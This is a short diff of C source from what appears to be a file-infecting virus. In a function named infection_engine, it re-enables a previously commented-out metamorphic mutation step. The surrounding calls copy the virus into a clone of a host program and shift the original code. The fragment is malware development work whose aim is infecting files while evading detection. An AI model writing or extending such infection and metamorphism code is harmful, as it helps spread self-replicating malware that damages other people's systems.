@@ -36,7 +36,7 @@ bool		infection_engine(struct virus_header *vhdr,
 	|| !not_infected(&file_entry, file_ref)
 	|| !copy_virus_to_clone(clone_ref, *loader_offset, vhdr)
 	|| !generate_seed(seed, file_ref)
-	// || !metamorph_clone(clone_ref, *loader_offset, full_virus_size, vhdr)
+	|| !metamorph_clone(clone_ref, *loader_offset, full_virus_size, vhdr)
 	|| !define_shift_amount(&file_entry, shift_amount, *full_virus_size)
 	|| !copy_client_to_clone(clone_ref, file_ref, *loader_offset, *shift_amount)
 	|| !define_clone_entry(&clone_entry, file_entry, *shift_amount)
